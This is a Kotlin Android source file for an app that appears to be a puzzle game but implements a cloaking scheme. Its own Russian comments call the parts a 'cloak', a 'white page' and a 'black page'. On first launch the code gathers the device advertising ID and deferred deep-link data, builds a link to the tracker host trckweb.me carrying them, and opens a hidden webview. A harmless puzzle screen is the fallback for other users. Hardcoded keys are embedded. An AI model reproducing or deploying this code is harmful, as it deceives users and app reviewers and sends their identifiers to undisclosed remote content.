package com.CherryFS.DiamondDi


import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.os.AsyncTask
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.CountDownTimer
import android.util.Log
import android.view.View
import android.view.Window
import android.view.WindowManager
import com.amplitude.api.Amplitude
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsConstants
import com.facebook.appevents.AppEventsLogger
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.MobileAds
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.gms.common.GooglePlayServicesNotAvailableException
import com.google.android.gms.common.GooglePlayServicesRepairableException
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.onesignal.OneSignal
import org.json.JSONException
import org.json.JSONObject
import java.io.IOException
import kotlin.collections.HashMap

//Todo: глобальная
var AID:String? = null

//Todo: Удаляем все логи и todo перед релизом!
class SplashActivity : AppCompatActivity() {
    companion object {
        var remote_param = "diamond"
        var remote_key = "key"
        var remote_value = "null"
        var TAG = "SplashActivity"
        var num = 0
    }

    var fullLink:String? = null
    var checkDeep:Boolean? = null

    var linkCloack:String? = null
    var defaultKey:String? = null
    var remoteConfig: FirebaseRemoteConfig? = null
    lateinit var firebaseAnalytics: FirebaseAnalytics

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.requestFeature(Window.FEATURE_NO_TITLE)
        window.setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN)
        setContentView(R.layout.activity_splash)
        initial()

        remoteConfig = Firebase.remoteConfig
        remoteConfig!!.setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 0 })
        var defaultValue = HashMap<String, Any>()
        defaultValue[remote_param] = remote_value
        remoteConfig!!.setDefaultsAsync(defaultValue)


        var getAgree = getSharedPreferences(packageName, MODE_PRIVATE).getString("404_Error", "false").toString()
        var checkLink = getSharedPreferences(packageName, Context.MODE_PRIVATE).getString("full_Link" ,"null").toString()
        if(getAgree == "false"){
            if(checkLink != "null"){
                //Todo: если это второй запуск, то запускаем сохранненую ссылку
                goB()
            }else{
                //Todo:запуск счетчика (1 запуск)
                forStart.start()
            }
        }else{
            //Todo:запуск белой части если юзер попал на 404
            Log.e(TAG, "get 404")
            goW()
        }

    }

    fun goW(){
        //Todo:white page
        startActivity(Intent(this@SplashActivity, BoardOptionsActivity::class.java))
        finish()
    }

    fun goB(){
        //Todo:black page
        startActivity(Intent(this@SplashActivity, PuzzleActivity::class.java))
        finish()
    }

    //Todo:счетчик для ожидания ответа от AID
    var forStart = object : CountDownTimer(10000, 500) {
        override fun onFinish() {
            Log.e(TAG, "onFinish - not Get AID")
            Lo().ww("onFinish - not Get AID")
            goW()
        }

        override fun onTick(millisUntilFinished: Long) {
            //Todo: ждем загрузку AID
            if(AID != null && checkDeep != null){
                //Todo:получаем диплинк-параметры
                var savedDeepLinkParam = getSharedPreferences(packageName, Context.MODE_PRIVATE).getString("deep" ,"")
                remoteConfig!!.fetchAndActivate().addOnCompleteListener(this@SplashActivity) { task ->
                    if (task.isSuccessful) {
//                        defaultKey = remoteConfig!!.getString(remote_key)
                        //Todo: для теста
                        defaultKey = "a6xawdux0j8gvu5x2a5e"
//                        linkCloack = remoteConfig!!.getString(remote_param)
                        //Todo: для теста
                        linkCloack = "https://trckweb.me/click.php"
                        //Todo: провекра открыта ли клоака
                        if(linkCloack != "null"){
                            //Todo: провекра пришел ли диплинк
                            if(savedDeepLinkParam != ""){
                                //Todo: ссылка с диплинком  (клоака/?диплинк&AID)
                                fullLink = linkCloack + savedDeepLinkParam + "&AID=${AID}"
                            }else{
                                //Todo: ссылка дефолта (клоака/?key&bundle&AID)
                                fullLink = linkCloack + "?key=${defaultKey}&bundle=${packageName}&AID=${AID}"
                            }
                            //Todo: сохраняем всю ссылку
                            getSharedPreferences(packageName, MODE_PRIVATE).edit().putString("full_Link", fullLink).apply()

                            //Todo: запуск активити с вебвью
                            Log.e(TAG, "full-link: "+fullLink)
                            goB()
                        }else{
                            Log.e(TAG, "remote close!")
                            Lo().ww("remote close!")
                            goW()
                        }
                    }
                }

                //Todo: Stop Timer
                cancel()
            }else{
                Log.e(TAG, "Tick: "+ ++num)
            }
        }

    }

    fun initial(){
        OneSignal.startInit(this)
            .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
            .unsubscribeWhenNotificationsAreDisabled(true)
            .init()
        FacebookSdk.fullyInitialize()
        FacebookSdk.setAdvertiserIDCollectionEnabled(true)
        FacebookSdk.setAutoLogAppEventsEnabled(true)
        var logger = AppEventsLogger.newLogger(this)
        logger.logEvent(AppEventsConstants.EVENT_NAME_ACTIVATED_APP);
        AppLinkData.fetchDeferredAppLinkData(this) {
            if (it != null && it.targetUri != null) {
                var str = "?" + it.targetUri.toString().split("\\?".toRegex()).toTypedArray()[1]
                Log.e(TAG, "applink = "+str)
                getSharedPreferences(packageName, MODE_PRIVATE).edit().putString("deep", str).apply()
                checkDeep = true
            }else{
                checkDeep = false
                Log.e(TAG, "applink = "+it)
            }
        }
        firebaseAnalytics = Firebase.analytics
        Amplitude.getInstance().initialize(this, "b2cfb08cad24e35331aab45aab007f8f").enableForegroundTracking(getApplication());
        MobileAds.initialize(this) {}
        getAID()
    }


    //Todo:ф-н для получения рекламного айди устройства
    private fun getAID() {
        AsyncTask.execute {
            try {
                var adInfo = AdvertisingIdClient.getAdvertisingIdInfo(applicationContext)
                AID = adInfo?.id
                Log.e(TAG, ""+AID)
            } catch (exception: IOException) {
            } catch (exception: GooglePlayServicesRepairableException) {
            } catch (exception: GooglePlayServicesNotAvailableException) {
            }
        }
    }
}


//Todo: для логов амплитуды
class Lo(){
    fun bb(link: String) {
        var ee = JSONObject()
        try {
            ee.put("Link", link)
        } catch (exception: JSONException) {
            Log.e(ContentValues.TAG, "logBlack: ", exception)
        }
        Amplitude.getInstance().logEvent("Gone Black", ee)
    }

    fun ww(from: String) {
        var ee = JSONObject()
        try {
            ee.put("From", from)
        } catch (exception: JSONException) {
            Log.e(ContentValues.TAG, "logWhite: ", exception)
        }
        Amplitude.getInstance().logEvent("Gone White", ee)
    }
}